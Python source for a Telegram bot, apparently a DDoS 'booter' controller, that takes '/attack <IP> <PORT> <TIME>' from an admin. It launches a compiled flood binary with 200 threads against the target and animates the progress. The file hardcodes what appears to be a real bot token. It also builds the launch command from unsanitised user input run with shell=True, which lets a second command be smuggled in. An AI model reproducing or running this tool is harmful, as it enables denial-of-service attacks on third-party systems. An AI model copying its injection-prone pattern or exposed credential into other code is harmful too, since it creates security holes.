import telebot
import subprocess
import threading
import time
import os

# --- Configuration ---
TOKEN = "8614821603:AAGAfZUEOHd79vgtTQh4MAFbat3v4QU9j5o"
ADMIN_ID = 7903853982
# Humne jo binary compile ki uska naam yahan likho
BINARY_NAME = "./prime_god" 

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(m, "🔥 **PRIMEXARMY ULTRA V2** 🔥\n\nStatus: `READY`\nAdmin: @Pk_Chopra\n\nCommands:\n`/attack <IP> <PORT> <TIME>`")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, "❌ **UNAUTHORIZED!**\nOnly Admin can use this weapon.")
        return

    try:
        parts = m.text.split()
        if len(parts) != 4:
            bot.reply_to(m, "📝 **Usage:** `/attack <IP> <PORT> <TIME>`")
            return

        ip, port, duration = parts[1], parts[2], parts[3]
        
        # Check if binary exists
        if not os.path.exists(BINARY_NAME):
            bot.reply_to(m, "❌ **Error:** Binary not found! Compile `prime_god.c` first.")
            return

        # UI Response
        msg = bot.send_message(m.chat.id, f"🚀 **STRIKE SENT!**\n\n📍 **Target:** `{ip}:{port}`\n⏳ **Time:** `{duration}s`\n🔥 **Power:** `God-Mode`", parse_mode="Markdown")

        # Background Attack Execution (150-200 Threads for Best Result)
        # ./prime_god <IP> <PORT> <TIME> <THREADS>
        subprocess.Popen(f"{BINARY_NAME} {ip} {port} {duration} 200", shell=True)

        # Animation Task
        def animate():
            total = int(duration)
            for i in range(1, 11):
                time.sleep(total/10)
                bar = "█" * i + "░" * (10-i)
                try:
                    bot.edit_message_text(f"🔥 **CHUDAYI ONGOING** 🔥\n\n📍 **Target:** `{ip}:{port}`\n[{bar}] {i*10}%", m.chat.id, msg.message_id, parse_mode="Markdown")
                except: pass
            bot.send_message(m.chat.id, f"✅ **Attack Finished on {ip}:{port}**")

        threading.Thread(target=animate).start()

    except Exception as e:
        bot.reply_to(m, f"⚠️ **Error:** {str(e)}")

bot.polling()